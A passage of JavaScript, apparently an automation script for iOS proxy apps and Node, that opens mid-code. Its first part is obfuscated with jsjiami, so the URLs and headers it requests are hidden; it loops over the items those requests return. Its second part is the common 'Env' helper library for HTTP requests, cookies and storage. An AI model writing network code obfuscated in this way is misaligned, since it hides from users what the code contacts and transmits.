('96','O3dU')](_0x5ebf71);}}});});}function shuye72(){var _0x2362d9={'dQDgE':function(_0x984bcd,_0x2637eb){return _0x984bcd!==_0x2637eb;},'EdtBE':_0x287c('97','D7^q'),'szpRw':function(_0x7d9bf1){return _0x7d9bf1();},'hpGed':function(_0x2dd85b,_0x27fbd9){return _0x2dd85b<_0x27fbd9;},'PSBte':function(_0x57dcd3,_0x143e2e){return _0x57dcd3(_0x143e2e);},'DsCJN':_0x287c('98','H7RC'),'bTwZE':_0x287c('99','qv5z')};return new Promise(_0x3965ab=>{$[_0x287c('9a','nI!T')]({'url':_0x2362d9[_0x287c('9b','DVmm')],'headers':{'User-Agent':_0x2362d9[_0x287c('9c','nI!T')]}},async(_0x230e83,_0x258915,_0x3bbe44)=>{try{if(_0x230e83){console[_0x287c('9d','$3dK')]($[_0x287c('9e','O3dU')]+_0x287c('9f','aS$f'));}else{if(_0x2362d9[_0x287c('a0','Hpsg')](_0x2362d9[_0x287c('a1','W#)y')],_0x2362d9[_0x287c('a2','#Qam')])){console[_0x287c('a3','ipCP')]($[_0x287c('a4',')8I#')]+_0x287c('a5','H7RC'));}else{$[_0x287c('a6','nI!T')]=JSON[_0x287c('a7','TNzg')](_0x3bbe44);await _0x2362d9[_0x287c('a8','DVmm')](shuye73);if(_0x2362d9[_0x287c('a9','H%7b')]($[_0x287c('aa','![uv')][_0x287c('ab','TNzg')][_0x287c('ac','P^KP')],0x0)){for(let _0x304376=0x0;_0x2362d9[_0x287c('ad','$3dK')](_0x304376,$[_0x287c('ae','#Qam')][_0x287c('af','IAKg')][_0x287c('b0','X^FW')]);_0x304376++){let _0x2ccfee=$[_0x287c('b1','ITJv')][_0x287c('b2','9DC1')][_0x304376];await $[_0x287c('b3','6A1[')](0x1f4);await _0x2362d9[_0x287c('b4','Huc8')](wuzhi,_0x2ccfee);}await _0x2362d9[_0x287c('b5','n&0i')](shuye74);}}}}catch(_0xdb50f1){$[_0x287c('b6','DVmm')](_0xdb50f1);}finally{_0x2362d9[_0x287c('b7','6A1[')](_0x3965ab);}});});}function shuye73(){var _0x7d19a4={'jZOAz':function(_0x187986,_0x236080){return _0x187986!==_0x236080;},'Ukood':_0x287c('b8','4%a1'),'cVOXa':_0x287c('b9','cQce'),'avmQH':function(_0x5d41b5,_0x1dc971){return _0x5d41b5===_0x1dc971;},'UdMnL':_0x287c('ba','pJ5G'),'XYGQx':function(_0x2878d3){return _0x2878d3();},'uSFCH':_0x287c('bb','DVmm'),'eOigC':_0x287c('bc','RcCV'),'JpKcE':_0x287c('bd','H7RC')};return new Promise(_0x2f9453=>{if(_0x7d19a4[_0x287c('be','aS$f')](_0x7d19a4[_0x287c('bf','D!nC')],_0x7d19a4[_0x287c('c0','$3dK')])){$[_0x287c('c1','H7RC')]({'url':_0x7d19a4[_0x287c('c2','Hpsg')],'headers':{'User-Agent':_0x7d19a4[_0x287c('c3','![uv')]}},async(_0x3ab954,_0x4d8c9a,_0x5785de)=>{if(_0x7d19a4[_0x287c('c4','L$n#')](_0x7d19a4[_0x287c('c5','Hpsg')],_0x7d19a4[_0x287c('c6','aS$f')])){try{if(_0x3ab954){if(_0x7d19a4[_0x287c('c7','4%a1')](_0x7d19a4[_0x287c('c8','uQ#5')],_0x7d19a4[_0x287c('c9','D7^q')])){console[_0x287c('ca','Je[J')]($[_0x287c('cb','H%7b')]+_0x287c('cc',')8I#'));}else{_0x5785de=JSON[_0x287c('cd','cQce')](_0x5785de);}}else{$[_0x287c('8c','kxS#')]=JSON[_0x287c('ce','pG&z')](_0x5785de);$[_0x287c('cf','P^KP')]=$[_0x287c('d0','oENf')][_0x287c('d1','Huc8')];}}catch(_0x4881ba){$[_0x287c('d2','nI!T')](_0x4881ba);}finally{_0x7d19a4[_0x287c('d3','i*au')](_0x2f9453);}}else{$[_0x287c('d4','n&0i')]=JSON[_0x287c('d5','aS$f')](_0x5785de);$[_0x287c('10','Huc8')]=$[_0x287c('d6','zcf9')][_0x287c('d7','H3RE')];}});}else{console[_0x287c('d8','O3dU')]($[_0x287c('d9','n&0i')]+_0x287c('da','6A1['));}});}function shuye74(){var _0xe5805c={'lMlRI':function(_0x50b115,_0x1e068e){return _0x50b115!==_0x1e068e;},'FVqgG':_0x287c('db','k1wH'),'rtUWm':function(_0x4d313e,_0xcd0ceb){return _0x4d313e(_0xcd0ceb);},'jarPw':function(_0x25b030,_0x398826){return _0x25b030<_0x398826;},'NzxVq':_0x287c('dc','rLXA'),'oDtVW':_0x287c('dd','uQ#5'),'KbLDP':function(_0x29ca31){return _0x29ca31();},'xRSbH':_0x287c('de','aS$f'),'KXViJ':_0x287c('df','D!nC'),'KyxKD':_0x287c('e0','pJ5G'),'hdVYN':_0x287c('e1','#JIp')};return new Promise(_0x5a7add=>{var _0x3be5ec={'SEsFL':function(_0x23ee4c){return _0xe5805c[_0x287c('e2','![uv')](_0x23ee4c);},'SkSyZ':function(_0x3ec9e8){return _0xe5805c[_0x287c('e3','nI!T')](_0x3ec9e8);}};if(_0xe5805c[_0x287c('e4','A[II')](_0xe5805c[_0x287c('e5','i*au')],_0xe5805c[_0x287c('e6','Je[J')])){$[_0x287c('e7','9DC1')]({'url':_0xe5805c[_0x287c('e8','H7RC')],'headers':{'User-Agent':_0xe5805c[_0x287c('e9','kxS#')]}},async(_0xc78a9d,_0x4ecd03,_0x552958)=>{try{if(_0xe5805c[_0x287c('ea','Zzi&')](_0xe5805c[_0x287c('eb','6A1[')],_0xe5805c[_0x287c('ec','n&0i')])){_0x3be5ec[_0x287c('ed','qv5z')](_0x5a7add);}else{if(_0xc78a9d){console[_0x287c('ee','#Qam')]($[_0x287c('ef','OFme')]+_0x287c('f0','5UAY'));}else{if(_0xe5805c[_0x287c('f1','7uP[')](safeGet,_0x552958)){$[_0x287c('f2','n&0i')]=JSON[_0x287c('f3','#Qam')](_0x552958);if(_0xe5805c[_0x287c('f4','DVmm')]($[_0x287c('f5','O3dU')][_0x287c('f6','cQce')],0x0)){for(let _0x8657dc=0x0;_0xe5805c[_0x287c('f7','5UAY')](_0x8657dc,$[_0x287c('aa','![uv')][_0x287c('f8','9DC1')][_0x287c('f9','W#)y')]);_0x8657dc++){let _0x354589=$[_0x287c('fa','RcCV')][_0x287c('fb','i*au')][_0x8657dc];await $[_0x287c('fc','4%a1')](0x1f4);await _0xe5805c[_0x287c('fd','zcf9')](wuzhi01,_0x354589);}}}}}}catch(_0x117f36){if(_0xe5805c[_0x287c('fe','aS$f')](_0xe5805c[_0x287c('ff','L$n#')],_0xe5805c[_0x287c('100','oENf')])){$[_0x287c('101','Hpsg')](_0x117f36);}else{console[_0x287c('102','OFme')]($[_0x287c('103','![uv')]+_0x287c('104','Zzi&'));}}finally{_0xe5805c[_0x287c('105','Hpsg')](_0x5a7add);}});}else{_0x3be5ec[_0x287c('106','$3dK')](_0x5a7add);}});};_0xodc='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}